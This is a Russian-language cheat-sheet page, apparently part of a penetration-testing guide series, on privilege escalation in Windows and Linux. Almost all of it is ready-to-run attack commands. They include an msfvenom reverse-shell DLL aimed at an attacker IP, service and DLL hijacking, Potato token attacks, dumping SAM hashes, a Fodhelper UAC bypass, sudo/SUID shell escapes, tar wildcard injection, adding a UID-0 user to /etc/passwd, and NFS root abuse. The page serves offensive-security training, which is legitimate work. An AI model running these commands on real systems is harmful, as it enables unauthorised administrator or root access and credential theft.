# ⬆️ Этап 3: Повышение привилегий

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[Английский оригинал](../03-Privilege-Escalation.md) • [Русский указатель](../../README.ru.md)
[🇹🇷 Türkçe Sürüm](03-Privilege-Escalation.tr.md) • [🇬🇷 Ελληνικά](03-Privilege-Escalation.el.md)

```
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

**Цель:** Повысить привилегии обычного пользователя до Administrator/SYSTEM в Windows или root в Linux.

> 📚 **Полные руководства:** [Повышение привилегий в Windows](../../Windows-PrivEsc/README.md) | [Повышение привилегий в Linux](../../Linux-PrivEsc/README.md)

---

## 🖥️ Повышение привилегий в Windows

### Быстрые варианты — проверить в первую очередь
```cmd
# Проверить текущие привилегии
whoami /priv
whoami /groups

# Проверить сохранённые учётные данные
cmdkey /list

# Файлы автоматической установки
dir /s C:\*unattend.xml C:\*sysprep.inf C:\*sysprep.xml 2>nul

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Эксплуатация служб

#### Путь к службе без кавычек
```cmd
# Найти пути без кавычек
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Если найдено: C:\Program Files\Some Service\service.exe
# Разместить вредоносный EXE по пути: C:\Program.exe или C:\Program Files\Some.exe
```

#### Слабые разрешения службы
```cmd
# Проверить разрешения службы с помощью accesschk
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# При наличии SERVICE_CHANGE_CONFIG:
sc config VulnService binpath="C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

#### Перехват загрузки DLL (DLL Hijacking)
```powershell
# Найти службы с отсутствующими DLL (с помощью Process Monitor)
# Разместить вредоносную DLL в каталоге службы
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### Олицетворение с помощью токенов (Token Impersonation)

#### SeImpersonatePrivilege (атаки семейства Potato)
```cmd
# Проверить наличие SeImpersonatePrivilege
whoami /priv

# PrintSpoofer (Windows 10/Server 2016-2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Windows 2012-2022)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\temp\shell.exe"

# JuicyPotato (Windows 7/Server 2008-2016)
.\JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}
```

#### SeBackupPrivilege
```powershell
# Сохранить копии SAM и SYSTEM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Извлечь хэши на машине атакующего
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Эксплуатация реестра
```cmd
# AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Пути заданий планировщика, доступные для записи
schtasks /query /fo LIST /v | findstr /i "Task To Run"

# Разрешения реестра
accesschk.exe -kvw hklm\SOFTWARE
```

### Обход UAC
```powershell
# Обход через Fodhelper (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

### Автоматизированные инструменты
```bash
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024.xlsx
```

---

## 🐧 Повышение привилегий в Linux

### Быстрые варианты — проверить в первую очередь
```bash
# Разрешения sudo
sudo -l

# Исполняемые файлы SUID
find / -perm -4000 -type f 2>/dev/null

# Доступный для записи /etc/passwd
ls -la /etc/passwd

# Версия ядра для подбора эксплойтов
uname -a
```

### Эксплуатация sudo

#### sudo без пароля
```bash
# Если sudo -l выводит: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# Если sudo -l выводит: (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# Если sudo -l выводит: (ALL) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/sh")'
```

#### Эксплуатация уязвимой версии sudo (CVE-2021-3156)
```bash
# Проверить версию sudo
sudo --version

# Если sudo < 1.9.5p2
# Использовать эксплойт: https://github.com/blasty/CVE-2021-3156
```

### Исполняемые файлы SUID/SGID
```bash
# Найти исполняемые файлы SUID
find / -perm -4000 -type f 2>/dev/null

# Проверить способы эксплуатации в GTFOBins
# https://gtfobins.github.io/

# Пример: SUID установлен для /usr/bin/find
/usr/bin/find . -exec /bin/sh -p \; -quit

# Пример: SUID установлен для /usr/bin/vim
/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Пример: SUID установлен для /usr/bin/python
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Capabilities (специальные полномочия Linux)
```bash
# Найти исполняемые файлы с capabilities
getcap -r / 2>/dev/null

# Пример: capability cap_setuid у python
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Задания cron
```bash
# Проверить задания cron
cat /etc/crontab
ls -la /etc/cron.*

# Найти скрипты, доступные для записи
# Внедрение аргументов через подстановочные символы в tar:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

### Перехват поиска через PATH
```bash
# Если задание cron или скрипт вызывает программу без полного пути
# Создать вредоносную программу в доступном для записи каталоге из PATH

echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
```

### Доступный для записи /etc/passwd

> **Уточнение:** строка `$1$evil$xyz...` ниже — сокращённый пример хэша, а не действительное значение. Указанные в исходнике диапазоны версий для эксплойтов ориентировочные; применимость зависит также от сборки и установленных исправлений.
```bash
# Если /etc/passwd доступен для записи
# Сгенерировать хэш пароля
openssl passwd -1 -salt evil password123

# Добавить пользователя с UID 0
echo 'evil:$1$evil$xyz...:0:0::/root:/bin/bash' >> /etc/passwd

# Переключиться на нового пользователя с правами root
su evil
```

### Эксплуатация ядра
```bash
# Проверить версию ядра
uname -r
cat /proc/version

# Поиск эксплойтов
searchsploit linux kernel 4.4 privilege escalation

# Известные эксплойты ядра:
# - DirtyCow (CVE-2016-5195) - ядро 2.x - 4.x
# - DirtyPipe (CVE-2022-0847) - ядро 5.8 - 5.16.11
```

### Эксплуатация NFS
```bash
# Проверить наличие no_root_squash
showmount -e 192.168.1.10
cat /etc/exports

# Если задано no_root_squash:
# Подключить общий ресурс и создать исполняемый файл SUID от имени root
mount -t nfs 192.168.1.10:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash

# На целевой системе:
/mnt/bash -p
```

### Автоматизированные инструменты
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux-exploit-suggester
./linux-exploit-suggester.sh

# Автоматическое перечисление в Linux (LSE)
./lse.sh -l 2
```

---

## 📊 Краткий справочник

### Контрольный список для Windows
```markdown
- [ ] whoami /priv (SeImpersonate, SeBackup, и др.)
- [ ] Пути служб без кавычек
- [ ] Слабые разрешения служб
- [ ] AlwaysInstallElevated
- [ ] Сохранённые учётные данные (cmdkey /list)
- [ ] Файлы Unattend/Sysprep
- [ ] Запланированные задания
- [ ] Запустить WinPEAS/PowerUp
```

### Контрольный список для Linux
```markdown
- [ ] sudo -l
- [ ] Исполняемые файлы SUID (проверить GTFOBins)
- [ ] Capabilities (специальные полномочия Linux)
- [ ] Задания cron (скрипты с правом записи, подстановочные символы)
- [ ] /etc/passwd доступен для записи
- [ ] Версия ядра (эксплойты)
- [ ] NFS no_root_squash
- [ ] Запустить LinPEAS
```

---

## 🔗 Связанные шпаргалки

- [Повышение привилегий в Windows (полное руководство)](../../Windows-PrivEsc/README.md)
- [Повышение привилегий в Linux (полное руководство)](../../Linux-PrivEsc/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**Предыдущий этап:** [← 02 - Перечисление](./02-Enumeration.ru.md)

**Следующий этап:** [04 - Боковое перемещение →](./04-Lateral-Movement.ru.md)
